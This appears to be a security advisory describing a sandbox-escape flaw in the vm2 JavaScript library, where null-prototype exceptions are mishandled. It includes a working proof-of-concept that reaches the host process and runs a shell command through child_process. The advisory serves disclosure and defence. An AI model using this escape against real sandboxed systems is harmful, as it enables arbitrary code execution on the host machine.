summary: "vm2 has Sandbox Breakout Through Null Proto Exception\n### Summary\n\nVM2 suffers\
  \ from a sandbox breakout vulnerability. This allows attackers to write code which can escape\
  \ from the VM2 sandbox and execute arbitrary commands on the host system.\n\n### Details\n\
  \nIn `handleException` due to ``// SECURITY (post-GHSA-mpf8 hardening): use `from` (not `ensureThis`)``\
  \ exceptions with a null proto will be assumed to come from the other side and being proxied.\
  \ Therefore, it is possible to get the proxied and unproxied object of a sandbox object with\
  \ a null proto when thrown and then catched which allows to get the host `Function` object.\n\
  \n### PoC\n\n```js\nconst {VM} = require(\"vm2\");\nconst vm = new VM();\nconsole.log(vm.run(`\n\
  const o = {__proto__: null};\ntry {\n\tthrow o;\n} catch (e) {\n\te.f = Buffer.prototype.inspect\n\
  \to.f.constructor(\"return process\")().mainModule.require('child_process').execSync('touch\
  \ pwned');\n}\n`));\n```\n\n### Impact\n\nAttackers can perform Remote Code Execution under\
  \ the assumption that arbitrary code can be executed inside the context of a vm2 sandbox."
